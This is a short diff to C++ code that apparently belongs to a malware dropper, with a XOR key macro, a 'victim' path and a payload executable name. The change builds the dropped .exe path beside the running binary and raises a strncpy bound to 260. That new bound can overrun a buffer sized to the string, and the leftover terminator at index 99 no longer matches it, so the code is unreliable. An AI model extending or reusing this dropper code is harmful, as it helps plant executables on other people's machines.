@@ -5,6 +5,8 @@
 // Required Imports
 #define _CRT_SECURE_NO_WARNINGS
 
+#define MAX_PATH_SIZE 260
+
 #ifndef DROPPER_XOR_KEY
 #define DROPPER_XOR_KEY 0
 #endif
@@ -69,15 +71,13 @@ int main(int argc, char* argv[])
 	// (char*) C:\\example\\path\\to\\your\\payload.exe
 	std::filesystem::path absolute_victim_path1 = std::filesystem::canonical(argv[0]).parent_path();
 
-	std::filesystem::path absolute_victim_name2 = absolute_victim_path1 / DROPPER_OUTPUT;
-
-	absolute_victim_name2 += ".exe";
+	std::filesystem::path absolute_victim_name2 = absolute_victim_path1 / (DROPPER_OUTPUT + std::string(".exe"));
 
 	std::string absolute_victim_name = absolute_victim_name2.string();
 
 	victim_name = new char[absolute_victim_name.size() + 1];
 
-	strncpy(victim_name, absolute_victim_name.c_str(), 100);
+	strncpy(victim_name, absolute_victim_name.c_str(), MAX_PATH_SIZE);
 
 	victim_name[99] = '\0';
 
